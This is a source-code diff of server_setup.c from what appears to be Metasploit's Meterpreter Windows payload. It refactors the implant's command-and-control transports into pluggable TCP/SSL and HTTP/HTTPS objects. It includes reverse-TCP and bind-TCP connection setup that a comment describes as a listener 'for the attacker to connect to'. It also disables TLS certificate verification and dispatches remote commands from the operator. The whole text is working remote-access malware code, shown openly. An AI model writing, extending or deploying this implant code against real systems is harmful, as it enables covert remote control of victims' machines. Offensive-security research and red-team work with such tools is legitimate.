@@ -15,13 +15,16 @@
 extern IN6_ADDR in6addr_any;
 #endif
 
-#ifdef USE_WINHTTP
+/*!
+ * @file server_setup.c
+ */
+#include "metsrv.h"
+#include "../../common/common.h"
+#include <ws2tcpip.h>
+
 #include "win/server_setup_winhttp.h"
-#define server_dispatch_http server_dispatch_http_winhttp
-#else
-#include "win/server_setup_wininet.h"
-#define server_dispatch_http server_dispatch_http_wininet
-#endif
+
+BOOL configure_tcp_connection(Remote* remote, SOCKET socket);
 
 extern Command* extensionCommands;
 
@@ -56,9 +59,6 @@ int exceptionfilter(unsigned int code, struct _EXCEPTION_POINTERS *ep)
 #define PREPEND_ERROR "### Error: "
 #define PREPEND_INFO  "### Info : "
 #define PREPEND_WARN  "### Warn : "
-
-/*! @brief This thread is the main server thread. */
-static THREAD * serverThread = NULL;
 
 /*! @brief An array of locks for use by OpenSSL. */
 static LOCK ** ssl_locks = NULL;
@@ -187,6 +187,7 @@ DWORD bind_tcp(u_short port, SOCKET* socketBuffer)
 		return WSAGetLastError();
 	}
 
+
 	// prepare a connection listener for the attacker to connect to, and we
 	// attempt to bind to both ipv6 and ipv4 by default, and fallback to ipv4
 	// only if the process fails.
@@ -256,49 +257,6 @@ DWORD bind_tcp(u_short port, SOCKET* socketBuffer)
 	}
 
 	*socketBuffer = acceptSocket;
-	return ERROR_SUCCESS;
-}
-
-DWORD establish_tcp_connection(wchar_t* url, SOCKET* socketBuffer)
-{
-	dprintf("[STAGELESS] Url: %S", url);
-	size_t charsConverted;
-	char asciiUrl[512];
-	wcstombs_s(&charsConverted, asciiUrl, sizeof(asciiUrl), url, sizeof(asciiUrl)-1);
-
-	if (strncmp(asciiUrl, "tcp", 3) == 0)
-	{
-		const int iRetryAttempts = 30;
-		char* pHost = strstr(asciiUrl, "//") + 2;
-		char* pPort = strrchr(pHost, ':') + 1;
-
-		// check if we're using IPv6
-		if (asciiUrl[3] == '6')
-		{
-			dprintf("[STAGELESS] IPv6");
-			char* pScopeId = strrchr(pHost, '?') + 1;
-			*(pScopeId - 1) = '\0';
-			*(pPort - 1) = '\0';
-			dprintf("[STAGELESS] IPv6 host %s port %S scopeid %S", pHost, pPort, pScopeId);
-			return reverse_tcp6(pHost, pPort, atol(pScopeId), iRetryAttempts, socketBuffer);
-		}
-
-		dprintf("[STAGELESS] IPv4");
-		u_short usPort = (u_short)atoi(pPort);
-
-		// if no host is specified, then we can assume that this is a bind payload, otherwise
-		// we'll assume that the payload is a reverse_tcp one and the given host is valid
-		// TODO: check to make sure this is a valid thing to do with IPv6
-		if (*pHost == ':')
-		{
-			dprintf("[STAGELESS] IPv4 bind port %s", pPort);
-			return bind_tcp(usPort, socketBuffer);
-		}
-
-		*(pPort - 1) = '\0';
-		dprintf("[STAGELESS] IPv4 host %s port %s", pHost, pPort);
-		return reverse_tcp4(pHost, usPort, iRetryAttempts, socketBuffer);
-	}
 	return ERROR_SUCCESS;
 }
 
@@ -378,16 +336,14 @@ static void server_dynamiclock_destroy(struct CRYPTO_dynlock_value* l, const cha
  * @brief Flush all pending data on the connected socket before doing SSL.
  * @param remote Pointer to the remote instance.
  */
-static VOID server_socket_flush(Remote * remote)
+static VOID server_socket_flush(Remote* remote)
 {
+	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
 	fd_set fdread;
 	DWORD ret;
-	SOCKET fd;
 	char buff[4096];
 
 	lock_acquire(remote->lock);
-
-	fd = remote_get_fd(remote);
 
 	while (1)
 	{
@@ -395,19 +351,19 @@ static VOID server_socket_flush(Remote * remote)
 		LONG data;
 
 		FD_ZERO(&fdread);
-		FD_SET(fd, &fdread);
+		FD_SET(ctx->fd, &fdread);
 
 		// Wait for up to one second for any errant socket data to appear
 		tv.tv_sec = 1;
 		tv.tv_usec = 0;
 
-		data = select((int)fd + 1, &fdread, NULL, NULL, &tv);
+		data = select((int)ctx->fd + 1, &fdread, NULL, NULL, &tv);
 		if (data == 0)
 		{
 			break;
 		}
 
-		ret = recv(fd, buff, sizeof(buff), 0);
+		ret = recv(ctx->fd, buff, sizeof(buff), 0);
 		dprintf("[SERVER] Flushed %d bytes from the buffer", ret);
 
 		// The socket closed while we waited
@@ -428,22 +384,20 @@ static VOID server_socket_flush(Remote * remote)
  */
 static LONG server_socket_poll(Remote * remote, long timeout)
 {
+	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
 	struct timeval tv;
 	LONG result;
 	fd_set fdread;
-	SOCKET fd;
 
 	lock_acquire(remote->lock);
 
-	fd = remote_get_fd(remote);
-
 	FD_ZERO(&fdread);
-	FD_SET(fd, &fdread);
+	FD_SET(ctx->fd, &fdread);
 
 	tv.tv_sec = 0;
 	tv.tv_usec = timeout;
 
-	result = select((int)fd + 1, &fdread, NULL, NULL, &tv);
+	result = select((int)ctx->fd + 1, &fdread, NULL, NULL, &tv);
 
 	lock_release(remote->lock);
 
@@ -494,22 +448,25 @@ static BOOL server_initialize_ssl(Remote * remote)
  * @return Indication of success or failure.
  * @param remote Pointer to the remote instance.
  */
-static BOOL server_destroy_ssl(Remote * remote)
+static BOOL server_destroy_ssl(Remote* remote)
 {
+	TcpTransportContext* ctx = NULL;
 	int i = 0;
 
-	if (remote == NULL)
+	if (remote == NULL || remote->transport == NULL || remote->transport->ctx == NULL)
 	{
 		return FALSE;
 	}
+
+	ctx = (TcpTransportContext*)remote->transport->ctx;
 
 	dprintf("[SERVER] Destroying SSL");
 
 	lock_acquire(remote->lock);
 
-	SSL_free(remote->ssl);
+	SSL_free(ctx->ssl);
 
-	SSL_CTX_free(remote->ctx);
+	SSL_CTX_free(ctx->ctx);
 
 	CRYPTO_set_locking_callback(NULL);
 	CRYPTO_set_id_callback(NULL);
@@ -529,8 +486,6 @@ static BOOL server_destroy_ssl(Remote * remote)
 	return TRUE;
 }
 
-/*
- */
 /*!
  * @brief Negotiate SSL on the socket.
  * @return Indication of success or failure.
@@ -538,6 +493,7 @@ static BOOL server_destroy_ssl(Remote * remote)
  */
 static BOOL server_negotiate_ssl(Remote *remote)
 {
+	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
 	BOOL success = TRUE;
 	SOCKET fd = 0;
 	DWORD ret = 0;
@@ -547,17 +503,15 @@ static BOOL server_negotiate_ssl(Remote *remote)
 
 	do
 	{
-		fd = remote_get_fd(remote);
+		ctx->meth = TLSv1_client_method();
 
-		remote->meth = TLSv1_client_method();
+		ctx->ctx = SSL_CTX_new(ctx->meth);
+		SSL_CTX_set_mode(ctx->ctx, SSL_MODE_AUTO_RETRY);
 
-		remote->ctx = SSL_CTX_new(remote->meth);
-		SSL_CTX_set_mode(remote->ctx, SSL_MODE_AUTO_RETRY);
+		ctx->ssl = SSL_new(ctx->ctx);
+		SSL_set_verify(ctx->ssl, SSL_VERIFY_NONE, NULL);
 
-		remote->ssl = SSL_new(remote->ctx);
-		SSL_set_verify(remote->ssl, SSL_VERIFY_NONE, NULL);
-
-		if (SSL_set_fd(remote->ssl, (int)remote->fd) == 0)
+		if (SSL_set_fd(ctx->ssl, (int)ctx->fd) == 0)
 		{
 			dprintf("[SERVER] set fd failed");
 			success = FALSE;
@@ -566,9 +520,9 @@ static BOOL server_negotiate_ssl(Remote *remote)
 
 		do
 		{
-			if ((ret = SSL_connect(remote->ssl)) != 1)
+			if ((ret = SSL_connect(ctx->ssl)) != 1)
 			{
-				res = SSL_get_error(remote->ssl, ret);
+				res = SSL_get_error(ctx->ssl, ret);
 				dprintf("[SERVER] connect failed %d\n", res);
 
 				if (res == SSL_ERROR_WANT_READ || res == SSL_ERROR_WANT_WRITE)
@@ -586,9 +540,9 @@ static BOOL server_negotiate_ssl(Remote *remote)
 
 		dprintf("[SERVER] Sending a HTTP GET request to the remote side...");
 
-		if ((ret = SSL_write(remote->ssl, "GET /123456789 HTTP/1.0\r\n\r\n", 27)) <= 0)
+		if ((ret = SSL_write(ctx->ssl, "GET /123456789 HTTP/1.0\r\n\r\n", 27)) <= 0)
 		{
-			dprintf("[SERVER] SSL write failed during negotiation with return: %d (%d)", ret, SSL_get_error(remote->ssl, ret));
+			dprintf("[SERVER] SSL write failed during negotiation with return: %d (%d)", ret, SSL_get_error(ctx->ssl, ret));
 		}
 
 	} while (0);
@@ -610,7 +564,7 @@ static BOOL server_negotiate_ssl(Remote *remote)
  * @param remote Pointer to the remote endpoint for this server connection.
  * @returns Indication of success or failure.
  */
-static DWORD server_dispatch(Remote * remote)
+static DWORD server_dispatch(Remote* remote, THREAD* dispatchThread)
 {
 	BOOL running = TRUE;
 	LONG result = ERROR_SUCCESS;
@@ -628,7 +582,7 @@ static DWORD server_dispatch(Remote * remote)
 
 	while (running)
 	{
-		if (event_poll(serverThread->sigterm, 0))
+		if (event_poll(dispatchThread->sigterm, 0))
 		{
 			dprintf("[DISPATCH] server dispatch thread signaled to terminate...");
 			break;
@@ -637,7 +591,7 @@ static DWORD server_dispatch(Remote * remote)
 		result = server_socket_poll(remote, 100);
 		if (result > 0)
 		{
-			result = packet_receive(remote, &packet);
+			result = remote->transport->packet_receive(remote, &packet);
 			if (result != ERROR_SUCCESS)
 			{
 				dprintf("[DISPATCH] packet_receive returned %d, exiting dispatcher...", result);
@@ -726,11 +680,159 @@ VOID load_stageless_extensions(Remote* pRemote, ULONG_PTR fd)
 	dprintf("[SERVER] All stageless extensions loaded");
 }
 
+SOCKET tcp_transport_get_socket(Transport* transport)
+{
+	return ((TcpTransportContext*)transport->ctx)->fd;
+}
+
+void transport_destroy_tcp(Remote* remote)
+{
+	if (remote && remote->transport)
+	{
+		dprintf("[TRANS TCP] Destroying tcp transport for url %S", remote->transport->url);
+		SAFE_FREE(remote->transport->url);
+		SAFE_FREE(remote->transport);
+	}
+}
+
+Transport* transport_create_tcp(wchar_t* url)
+{
+	Transport* transport = (Transport*)malloc(sizeof(Transport));
+	TcpTransportContext* ctx = (TcpTransportContext*)malloc(sizeof(TcpTransportContext));
+
+	dprintf("[TRANS TCP] Creating tcp transport for url %S", url);
+
+	memset(transport, 0, sizeof(Transport));
+	memset(ctx, 0, sizeof(TcpTransportContext));
+
+	transport->url = _wcsdup(url);
+	transport->packet_receive = packet_receive_via_ssl;
+	transport->packet_transmit = packet_transmit_via_ssl;
+	transport->transport_init = configure_tcp_connection;
+	transport->transport_deinit = server_destroy_ssl;
+	transport->transport_destroy = transport_destroy_tcp;
+	transport->server_dispatch = server_dispatch;
+	transport->get_socket = tcp_transport_get_socket;
+	transport->ctx = ctx;
+	transport->type = METERPRETER_TRANSPORT_SSL;
+
+	return transport;
+}
+
+void transport_destroy_http(Remote* remote)
+{
+	if (remote && remote->transport)
+	{
+		HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;
+
+		dprintf("[TRANS HTTP] Destroying http transport for url %S", remote->transport->url);
+
+		SAFE_FREE(remote->transport->url);
+		SAFE_FREE(ctx->cert_hash);
+		SAFE_FREE(ctx->proxy);
+		SAFE_FREE(ctx->proxy_pass);
+		SAFE_FREE(ctx->proxy_user);
+		SAFE_FREE(ctx->ua);
+		SAFE_FREE(ctx->uri);
+		SAFE_FREE(remote->transport);
+	}
+}
+
+Transport* transport_create_http(BOOL ssl, wchar_t* url, wchar_t* ua, wchar_t* proxy,
+	wchar_t* proxyUser, wchar_t* proxyPass, PBYTE certHash, int expirationTime, int commsTimeout)
+{
+	Transport* transport = (Transport*)malloc(sizeof(Transport));
+	HttpTransportContext* ctx = (HttpTransportContext*)malloc(sizeof(HttpTransportContext));
+
+	dprintf("[TRANS HTTP] Creating http transport for url %S", url);
+
+	memset(transport, 0, sizeof(Transport));
+	memset(ctx, 0, sizeof(HttpTransportContext));
+
+	if (expirationTime > 0)
+	{
+		ctx->expiration_time = current_unix_timestamp() + expirationTime;
+	}
+
+	ctx->comm_timeout = commsTimeout;
+	ctx->start_time = current_unix_timestamp();
+	ctx->comm_last_packet = current_unix_timestamp();
+
+	if (ua)
+	{
+		ctx->ua = _wcsdup(ua);
+	}
+	if (proxy && wcscmp(proxy, L"METERPRETER_PROXY") != 0)
+	{
+		ctx->proxy = _wcsdup(proxy);
+	}
+	if (proxyUser && wcscmp(proxyUser, L"METERPRETER_USERNAME_PROXY") != 0)
+	{
+		ctx->proxy_user = _wcsdup(proxyUser);
+	}
+	if (proxyPass && wcscmp(proxyPass, L"METERPRETER_PASSWORD_PROXY") != 0)
+	{
+		ctx->proxy_pass = _wcsdup(proxyPass);
+	}
+	ctx->ssl = ssl;
+
+	// only apply the cert hash if we're given one and it's not the global value
+	if (certHash && strncmp((char*)certHash, "METERPRETER_SSL_CERT_HASH", 20) != 0)
+	{
+		ctx->cert_hash = (PBYTE)malloc(sizeof(BYTE) * 20);
+		memcpy(ctx->cert_hash, certHash, 20);
+	}
+
+	transport->url = _wcsdup(url);
+	transport->packet_receive = packet_receive_via_http;
+	transport->packet_transmit = packet_transmit_via_http;
+	transport->server_dispatch = server_dispatch_http_winhttp;
+	transport->transport_init = server_init_http_winhttp;
+	transport->transport_deinit = server_deinit_http_winhttp;
+	transport->transport_destroy = transport_destroy_http;
+	transport->ctx = ctx;
+	transport->type = ssl ? METERPRETER_TRANSPORT_HTTPS : METERPRETER_TRANSPORT_HTTP;
+
+#ifdef DEBUGTRACE
+	if (ssl && certHash)
+	{
+		PBYTE hash = certHash;
+		dprintf("[SERVER] Using HTTPS transport: Hash set to: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
+			hash[0], hash[1], hash[2], hash[3], hash[4], hash[5], hash[6], hash[7], hash[8], hash[9], hash[10],
+			hash[11], hash[12], hash[13], hash[14], hash[15], hash[16], hash[17], hash[18], hash[19]);
+		dprintf("[SERVER] is validating hashes %p", hash);
+	}
+#endif
+
+	return transport;
+}
+
+Transport* transport_create(wchar_t* transport, wchar_t* url)
+{
+	Transport* t = NULL;
+	dprintf("[TRANSPORT] Type = %S", transport);
+	dprintf("[TRANSPORT] URL = %S", url);
+
+	if (wcscmp(transport, L"TRANSPORT_SSL") == 0)
+	{
+		t = transport_create_tcp(url);
+	}
+	else
+	{
+		BOOL ssl = wcscmp(transport, L"TRANSPORT_HTTPS") == 0;
+		t = transport_create_http(ssl, url, global_meterpreter_ua, global_meterpreter_proxy, global_meterpreter_proxy_username,
+			global_meterpreter_proxy_password, global_meterpreter_ssl_cert_hash, global_expiration_timeout, global_comm_timeout);
+	}
+
+	return t;
+}
+
 /*
  * Setup and run the server. This is called from Init via the loader.
  */
 DWORD server_setup(SOCKET fd)
 {
+	THREAD* serverThread = NULL;
 	Remote* pRemote = NULL;
 	char cStationName[256] = { 0 };
 	char cDesktopName[256] = { 0 };
@@ -759,56 +861,11 @@ DWORD server_setup(SOCKET fd)
 
 			dprintf("[SERVER] main server thread: handle=0x%08X id=0x%08X sigterm=0x%08X", serverThread->handle, serverThread->id, serverThread->sigterm);
 
-			if (!(pRemote = remote_allocate(fd)))
+			if (!(pRemote = remote_allocate()))
 			{
 				SetLastError(ERROR_NOT_ENOUGH_MEMORY);
 				break;
 			}
-
-			pRemote->url = global_meterpreter_url;
-			if (bStageless)
-			{
-				// if stageless, we ignore the first 's'
-				pRemote->url += 1;
-			}
-
-			if (wcscmp(global_meterpreter_transport + 12, L"TRANSPORT_SSL") == 0)
-			{
-				pRemote->transport = METERPRETER_TRANSPORT_SSL;
-				dprintf("[SERVER] Using SSL transport on socket %ul...", fd);
-
-				dprintf("[SERVER] setting up stageless comms if required...");
-				res = establish_tcp_connection(pRemote->url, &pRemote->fd);
-				if (res != ERROR_SUCCESS)
-				{
-					dprintf("[SERVER] Failed to get TCP communications running: %u (%x)", res, res);
-					break;
-				}
-			}
-			else if (wcscmp(global_meterpreter_transport + 12, L"TRANSPORT_HTTPS") == 0)
-			{
-				PBYTE hash = global_meterpreter_ssl_cert_hash;
-				pRemote->transport = METERPRETER_TRANSPORT_HTTPS;
-				dprintf("[SERVER] Using HTTPS transport: Hash set to: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
-					hash[0], hash[1], hash[2], hash[3], hash[4], hash[5], hash[6], hash[7], hash[8], hash[9], hash[10],
-					hash[11], hash[12], hash[13], hash[14], hash[15], hash[16], hash[17], hash[18], hash[19]);
-
-				if (strcmp(hash, "METERPRETER_SSL_CERT_HASH") != 0)
-				{
-					pRemote->pCertHash = hash;
-					dprintf("[SERVER] is validating hashes %p", pRemote->pCertHash);
-				}
-			}
-			else if (wcscmp(global_meterpreter_transport + 12, L"TRANSPORT_HTTP") == 0)
-			{
-				pRemote->transport = METERPRETER_TRANSPORT_HTTP;
-				dprintf("[SERVER] Using HTTP transport...");
-			}
-
-			// Do not allow the file descriptor to be inherited by child processes
-			SetHandleInformation((HANDLE)pRemote->fd, HANDLE_FLAG_INHERIT, 0);
-
-			dprintf("[SERVER] Initializing tokens...");
 
 			// Store our thread handle
 			pRemote->hServerThread = serverThread->handle;
@@ -832,75 +889,48 @@ DWORD server_setup(SOCKET fd)
 			pRemote->cpOrigDesktopName = _strdup(cDesktopName);
 			pRemote->cpCurrentDesktopName = _strdup(cDesktopName);
 
-			// Process our default SSL-over-TCP transport
-			if (pRemote->transport == METERPRETER_TRANSPORT_SSL)
-			{
-				dprintf("[SERVER] Flushing the socket handle...");
-				server_socket_flush(pRemote);
+			dprintf("[SERVER] Registering dispatch routines...");
+			register_dispatch_routines();
 
-				dprintf("[SERVER] Initializing SSL...");
-				if (!server_initialize_ssl(pRemote))
+			if (bStageless)
+			{
+				// in the case of stageless payloads, fd contains a pointer to the extensions
+				// to load
+				dprintf("[SERVER] Loading stageless extensions");
+				load_stageless_extensions(pRemote, (ULONG_PTR)fd);
+			}
+
+			// allocate the "next transport" information
+			dprintf("[SERVER] creating transport");
+			pRemote->nextTransport = transport_create(global_meterpreter_transport + 12, global_meterpreter_url + (bStageless ? 1 : 0));
+
+			while (pRemote->nextTransport)
+			{
+				pRemote->transport = pRemote->nextTransport;
+				pRemote->nextTransport = NULL;
+
+				dprintf("[SERVER] initialising transport 0x%p", pRemote->transport->transport_init);
+				if (pRemote->transport->transport_init && !pRemote->transport->transport_init(pRemote, fd))
 				{
 					break;
 				}
 
-				dprintf("[SERVER] Negotiating SSL...");
-				if (!server_negotiate_ssl(pRemote))
+				dprintf("[SERVER] Entering the main server dispatch loop for transport %x, context %x", pRemote->transport, pRemote->transport->ctx);
+				pRemote->transport->server_dispatch(pRemote, serverThread);
+
+				if (pRemote->transport->transport_deinit)
 				{
-					break;
+					pRemote->transport->transport_deinit(pRemote);
 				}
 
-				dprintf("[SERVER] Registering dispatch routines...");
-				register_dispatch_routines();
-
-				if (bStageless)
-				{
-					// in the case of stageless payloads, fd contains a pointer to the extensions
-					// to load
-					dprintf("[SERVER] Loading stageless extensions");
-					load_stageless_extensions(pRemote, (ULONG_PTR)fd);
-				}
-
-				dprintf("[SERVER] Entering the main server dispatch loop for transport %d...", pRemote->transport);
-				server_dispatch(pRemote);
-
-				dprintf("[SERVER] Deregistering dispatch routines...");
-				deregister_dispatch_routines(pRemote);
+				pRemote->transport->transport_destroy(pRemote);
 			}
 
-			if (pRemote->transport == METERPRETER_TRANSPORT_HTTP || pRemote->transport == METERPRETER_TRANSPORT_HTTPS)
-			{
-				dprintf("[SERVER] Registering dispatch routines...");
-				register_dispatch_routines();
-
-				if (bStageless)
-				{
-					// in the case of stageless payloads, fd contains a pointer to the extensions
-					// to load
-					dprintf("[SERVER] Loading stageless extensions");
-					load_stageless_extensions(pRemote, (ULONG_PTR)fd);
-				}
-
-				dprintf("[SERVER] Entering the main server dispatch loop for transport %d...", pRemote->transport);
-				server_dispatch_http(pRemote, serverThread, global_expiration_timeout, global_comm_timeout, global_meterpreter_ua,
-					global_meterpreter_proxy, global_meterpreter_proxy_username, global_meterpreter_proxy_password);
-
-				dprintf("[SERVER] Deregistering dispatch routines...");
-				deregister_dispatch_routines(pRemote);
-			}
-
+			dprintf("[SERVER] Deregistering dispatch routines...");
+			deregister_dispatch_routines(pRemote);
 		} while (0);
 
-		if (pRemote->transport == METERPRETER_TRANSPORT_SSL)
-		{
-			dprintf("[SERVER] Closing down SSL...");
-			server_destroy_ssl(pRemote);
-		}
-
-		if (pRemote)
-		{
-			remote_deallocate(pRemote);
-		}
+		remote_deallocate(pRemote);
 	}
 	__except (exceptionfilter(GetExceptionCode(), GetExceptionInformation()))
 	{
@@ -911,4 +941,79 @@ DWORD server_setup(SOCKET fd)
 
 	dprintf("[SERVER] Finished.");
 	return res;
+}
+
+BOOL configure_tcp_connection(Remote* remote, SOCKET socket)
+{
+	DWORD result = ERROR_SUCCESS;
+	size_t charsConverted;
+	char asciiUrl[512];
+	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
+
+	wcstombs_s(&charsConverted, asciiUrl, sizeof(asciiUrl), remote->transport->url, sizeof(asciiUrl)-1);
+
+	if (strncmp(asciiUrl, "tcp", 3) == 0)
+	{
+		const int iRetryAttempts = 30;
+		char* pHost = strstr(asciiUrl, "//") + 2;
+		char* pPort = strrchr(pHost, ':') + 1;
+
+		// check if we're using IPv6
+		if (asciiUrl[3] == '6')
+		{
+			char* pScopeId = strrchr(pHost, '?') + 1;
+			*(pScopeId - 1) = '\0';
+			*(pPort - 1) = '\0';
+			dprintf("[STAGELESS] IPv6 host %s port %S scopeid %S", pHost, pPort, pScopeId);
+			result = reverse_tcp6(pHost, pPort, atol(pScopeId), iRetryAttempts, &ctx->fd);
+		}
+		else
+		{
+			u_short usPort = (u_short)atoi(pPort);
+
+			// if no host is specified, then we can assume that this is a bind payload, otherwise
+			// we'll assume that the payload is a reverse_tcp one and the given host is valid
+			if (*pHost == ':')
+			{
+				dprintf("[STAGELESS] IPv4 bind port %s", pPort);
+				result = bind_tcp(usPort, &ctx->fd);
+			}
+			else
+			{
+				*(pPort - 1) = '\0';
+				dprintf("[STAGELESS] IPv4 host %s port %s", pHost, pPort);
+				result = reverse_tcp4(pHost, usPort, iRetryAttempts, &ctx->fd);
+			}
+		}
+	}
+	else
+	{
+		// assume that we have been given a valid socket given that there's no stageless information
+		ctx->fd = socket;
+	}
+
+	if (result != ERROR_SUCCESS)
+	{
+		return FALSE;
+	}
+
+	// Do not allow the file descriptor to be inherited by child processes
+	SetHandleInformation((HANDLE)ctx->fd, HANDLE_FLAG_INHERIT, 0);
+
+	dprintf("[SERVER] Flushing the socket handle...");
+	server_socket_flush(remote);
+
+	dprintf("[SERVER] Initializing SSL...");
+	if (!server_initialize_ssl(remote))
+	{
+		return FALSE;
+	}
+
+	dprintf("[SERVER] Negotiating SSL...");
+	if (!server_negotiate_ssl(remote))
+	{
+		return FALSE;
+	}
+
+	return TRUE;
 }
